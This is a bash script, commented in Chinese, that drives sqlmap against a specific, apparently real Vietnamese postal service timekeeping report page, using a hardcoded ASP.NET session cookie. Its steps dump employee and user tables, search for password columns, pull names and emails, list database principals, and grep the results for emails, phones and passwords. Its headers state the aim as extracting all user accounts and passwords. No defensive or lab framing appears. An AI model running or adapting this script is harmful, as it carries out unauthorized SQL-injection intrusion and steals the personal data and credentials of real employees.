#!/bin/bash

SESSION="lswqd4itz5u4ftzm3jcmjfio"
TARGET='http://vps.vnpost.vn/chamcong/report/rpt_BCC.aspx?kyluong=112025&MA_DV=KVMB&TEN_DV=Kho%20v%E1%BA%ADn%20mi%E1%BB%81n%20b%E1%BA%AFc&MA_BP=TC&TEN_BP=BC%20Khai%20th%C3%A1c%20TC&MA_TO=VP&TEN_TO=V%C4%83n%20ph%C3%B2ng'

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔥 提取所有用户账号密码"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# [1] 导出NHAN_VIEN表（员工表）
echo ""
echo "[1] 导出NHAN_VIEN表（员工）..."
timeout 120 python3 /tmp/sqlmap/sqlmap.py -u "$TARGET" \
    --cookie="ASP.NET_SessionId=$SESSION" \
    --batch -D NSTL -T NHAN_VIEN --dump --threads=1 \
    -v 0 2>&1 | tee nhan_vien_dump.txt

# [2] 导出V_TT_USERS表（用户视图）
echo ""
echo "[2] 导出V_TT_USERS表（用户）..."
timeout 120 python3 /tmp/sqlmap/sqlmap.py -u "$TARGET" \
    --cookie="ASP.NET_SessionId=$SESSION" \
    --batch -D NSTL -T V_TT_USERS --dump --threads=1 \
    -v 0 2>&1 | tee v_tt_users_dump.txt

# [3] 查找密码字段
echo ""
echo "[3] 提取所有密码相关字段..."
timeout 60 python3 /tmp/sqlmap/sqlmap.py -u "$TARGET" \
    --cookie="ASP.NET_SessionId=$SESSION" \
    --batch -D NSTL -T NHAN_VIEN --columns \
    -v 0 2>&1 | grep -iE "password|pass|pwd|mat_khau" | tee password_columns.txt

# [4] 尝试直接查询密码
echo ""
echo "[4] 直接SQL查询获取账号密码..."
timeout 30 python3 /tmp/sqlmap/sqlmap.py -u "$TARGET" \
    --cookie="ASP.NET_SessionId=$SESSION" \
    --batch \
    --sql-query="SELECT TOP 50 MA_NV, TEN_NV, EMAIL FROM NSTL.dbo.NHAN_VIEN WHERE EMAIL IS NOT NULL" \
    -v 0 2>&1 | tee direct_query_users.txt

# [5] 查询系统用户表
echo ""
echo "[5] 查询系统用户表..."
timeout 60 python3 /tmp/sqlmap/sqlmap.py -u "$TARGET" \
    --cookie="ASP.NET_SessionId=$SESSION" \
    --batch \
    --sql-query="SELECT name, type_desc FROM sys.database_principals WHERE type IN ('S', 'U')" \
    -v 0 2>&1 | tee sys_users.txt

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "✅ 数据提取完成"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# 汇总结果
echo ""
echo "📊 敏感数据摘要:"
grep -iE "email|phone|password|账号|密码" *.txt 2>/dev/null | head -50
